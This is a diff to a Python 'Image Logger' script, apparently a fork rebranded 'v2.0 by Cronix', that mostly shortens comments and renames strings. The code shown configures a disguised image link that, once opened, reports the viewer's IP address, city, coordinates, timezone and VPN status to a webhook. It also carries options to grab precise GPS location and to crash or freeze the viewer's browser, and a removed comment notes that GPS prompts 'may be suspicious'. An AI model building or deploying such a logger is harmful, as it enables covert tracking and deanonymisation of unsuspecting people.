@@ -15,17 +15,17 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger v2.0 by Cronix", # Webhook Name
+    "color": 0xFF0000, # Embed Color
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Browser Crash/Freeze
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Location Grabber
 
-    "message": { # Show a custom message when the user opens the image
+    "message": { # Custom Message when Image opened
         "doMessage": False, # Enable the custom message?
-        "message": "Cronix is cool", # Message to show
+        "message": "Cronix is cool", # Message 
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -44,7 +44,6 @@ config = {
                 # 3 = Don't send an alert when it's possibly a bot
                 # 4 = Don't send an alert when it's 100% a bot
     
-
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
@@ -141,7 +140,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "IP-Address Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
@@ -154,7 +153,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coordinates:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Coordinates:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise: [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
